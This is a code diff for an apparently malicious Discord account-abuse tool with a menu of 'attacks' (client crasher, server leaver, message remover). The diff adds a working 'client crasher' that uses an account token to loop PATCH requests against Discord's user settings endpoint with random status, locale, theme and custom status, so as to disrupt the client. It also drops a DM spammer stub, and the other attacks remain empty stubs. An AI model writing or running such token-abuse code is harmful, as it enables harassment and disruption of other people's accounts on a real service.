@@ -1,17 +1,38 @@
-import requests, os, time
+import requests, os, time, random, string
 
 class attacks():
     
     def client_crasher(token):
-        pass
+        headers = {
+            "authorization": token
+        }
+        locales = ["da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg", "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"]
+        modes = ["light", "dark"]
+        statuses = ["online", "idle", "dnd", "invisible"]
+        count = 0
+        while True:
+            count += 1
+            try:
+                settings = {
+                "status": random.choice(statuses),
+                "locale": random.choice(locales),
+                "custom_status": {
+                    "text": "".join([random.choice(string.ascii_letters + string.digits) for i in range(40)])
+                },
+                "theme": random.choice(modes)
+                }
+                x = requests.patch("https://discord.com/api/v10/users/@me/settings", headers=headers, json=settings)
+                if x.status_code == 200:
+                    print("[*] Crashing client [REQUEST: {}]".format(count))
+                else:
+                    print("[*] Discord rate limit [REQUEST: {}]".format(count))
+            except:
+                break
     
     def server_leaver(token):
         pass
     
     def message_remover(token):
-        pass
-    
-    def dm_spammer(token):
         pass
 
 os.system("cls")
@@ -28,38 +49,30 @@ def main():
     print("[*] Loaded {} guilds\n".format(len(requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers).json())))
 
     time.sleep(2)
-    print("[0] Client crasher")
-    print("[1] Server leaver")
-    print("[2] Message remover")
-    print("[3] DM Spammer\n")
+    print("[1] Client crasher")
+    print("[2] Server leaver")
+    print("[3] Message remover")
 
     time.sleep(1)
     attack = int(input("[?] Select attack: "))
 
-    if attack == 0:
+    if attack == 1:
         os.system("cls")
         attacks.client_crasher(token)
         input("\n[*] Attack executed, press enter to continue.. ")
         time.sleep(1)
         os.system("cls")
         main()
-    elif attack == 1:
+    elif attack == 2:
         os.system("cls")
         attacks.server_leaver(token)
         input("\n[*] Attack executed, press enter to continue.. ")
         time.sleep(1)
         os.system("cls")
         main()
-    elif attack == 2:
-        os.system("cls")
-        attacks.message_remover(token)
-        input("\n[*] Attack executed, press enter to continue.. ")
-        time.sleep(1)
-        os.system("cls")
-        main()
     elif attack == 3:
         os.system("cls")
-        attacks.dm_spammer(token)
+        attacks.message_remover(token)
         input("\n[*] Attack executed, press enter to continue.. ")
         time.sleep(1)
         os.system("cls")
